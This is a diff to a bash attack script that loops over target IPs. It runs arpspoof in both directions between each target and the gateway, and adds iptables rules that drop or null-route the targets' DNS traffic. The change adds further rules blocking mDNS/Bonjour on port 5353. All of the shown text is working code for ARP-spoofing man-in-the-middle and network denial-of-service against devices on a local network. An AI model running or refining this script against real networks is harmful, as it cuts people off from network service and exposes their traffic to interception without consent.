@@ -47,7 +47,11 @@ for TARGET in $TARGET_IPS; do
         iptables -A FORWARD -d "$TARGET" -p tcp --sport 53 -j DROP
         iptables -t nat -A PREROUTING -s "$TARGET" -p udp --dport 53 -j DNAT --to-destination 0.0.0.0
         iptables -t nat -A PREROUTING -s "$TARGET" -p tcp --dport 53 -j DNAT --to-destination 0.0.0.0
-        
+
+        # Drop mDNS/Bonjour (common in WiFi networks)
+        iptables -A FORWARD -s "$TARGET" -p udp --dport 5353 -j DROP
+        iptables -A FORWARD -d "$TARGET" -p udp --sport 5353 -j DROP
+       
         # Expand subnet for ARP spoofing
         read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
         if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
@@ -77,7 +81,11 @@ for TARGET in $TARGET_IPS; do
         iptables -A FORWARD -d "$TARGET" -p tcp --sport 53 -j DROP
         iptables -t nat -A PREROUTING -s "$TARGET" -p udp --dport 53 -j DNAT --to-destination 0.0.0.0
         iptables -t nat -A PREROUTING -s "$TARGET" -p tcp --dport 53 -j DNAT --to-destination 0.0.0.0
-        
+
+        # Drop mDNS/Bonjour (common in WiFi networks)
+        iptables -A FORWARD -s "$TARGET" -p udp --dport 5353 -j DROP
+        iptables -A FORWARD -d "$TARGET" -p udp --sport 5353 -j DROP
+       
         (
             arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
             arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
